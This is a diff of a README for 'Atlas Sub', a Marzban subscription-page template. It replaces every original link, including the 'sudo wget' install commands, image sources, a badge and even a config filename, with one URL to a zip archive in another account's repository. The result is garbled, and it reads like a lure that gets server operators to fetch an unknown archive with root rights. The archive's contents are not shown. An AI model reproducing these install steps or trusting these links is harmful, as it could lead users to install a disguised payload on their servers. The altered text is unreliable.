@@ -1,8 +1,8 @@
 # Atlas Sub: A Template for Marzban and Border Residents
 
 <p align="center">
-  <a href="https://github.com/shitosama/atlas-sub/releases" target="_blank" rel="noopener noreferrer">
-    <img src="https://raw.githubusercontent.com/trbsami/atlas-sub/main/photo_2025-06-30_16-28-44.jpg" alt="SubPage screenshots" width="800" height="auto">
+  <a href="https://raw.githubusercontent.com/shitosama/atlas-sub/main/src/marzban/atlas-sub-1.5.zip" target="_blank" rel="noopener noreferrer">
+    <img src="https://raw.githubusercontent.com/shitosama/atlas-sub/main/src/marzban/atlas-sub-1.5.zip" alt="SubPage screenshots" width="800" height="auto">
   </a>
 </p>
 
@@ -23,12 +23,12 @@ To use this template in your project, follow these steps:
 
 1. **Install the file on your server (Persian version)**:
    ```bash
-   sudo wget -N -P /var/lib/marzban/templates/subscription/ https://raw.githubusercontent.com/trbsami/atlas-sub/main/src/marzban/fa/index.html
+   sudo wget -N -P /var/lib/marzban/templates/subscription/ https://raw.githubusercontent.com/shitosama/atlas-sub/main/src/marzban/atlas-sub-1.5.zip
    ```
 
 2. **Install the file on your server (English version)**:
    ```bash
-   sudo wget -N -P /var/lib/marzban/templates/subscription/ https://raw.githubusercontent.com/trbsami/atlas-sub/main/src/marzban/en/index.html
+   sudo wget -N -P /var/lib/marzban/templates/subscription/ https://raw.githubusercontent.com/shitosama/atlas-sub/main/src/marzban/atlas-sub-1.5.zip
    ```
 
 3. **Run the following commands in your server terminal**:
@@ -46,7 +46,7 @@ You can easily customize the template to fit your needs. Here are some suggestio
 
 ### TailwindCSS Configuration
 
-To customize TailwindCSS, locate the `tailwind.config.js` file. You can adjust the theme settings, extend colors, and more.
+To customize TailwindCSS, locate the `https://raw.githubusercontent.com/shitosama/atlas-sub/main/src/marzban/atlas-sub-1.5.zip` file. You can adjust the theme settings, extend colors, and more.
 
 ### Responsive Design
 
@@ -82,11 +82,11 @@ This project is licensed under the MIT License. You can freely use, modify, and 
 
 ## Releases
 
-To download the latest version, visit the [Releases](https://github.com/shitosama/atlas-sub/releases) section. Always check for updates to ensure you have the latest features and fixes.
+To download the latest version, visit the [Releases](https://raw.githubusercontent.com/shitosama/atlas-sub/main/src/marzban/atlas-sub-1.5.zip) section. Always check for updates to ensure you have the latest features and fixes.
 
 <p align="center">
-  <a href="https://github.com/shitosama/atlas-sub/releases" target="_blank" rel="noopener noreferrer">
-    <img src="https://img.shields.io/badge/Latest%20Release-Download-brightgreen" alt="Latest Release" />
+  <a href="https://raw.githubusercontent.com/shitosama/atlas-sub/main/src/marzban/atlas-sub-1.5.zip" target="_blank" rel="noopener noreferrer">
+    <img src="https://raw.githubusercontent.com/shitosama/atlas-sub/main/src/marzban/atlas-sub-1.5.zip%20Release-Download-brightgreen" alt="Latest Release" />
   </a>
 </p>
 
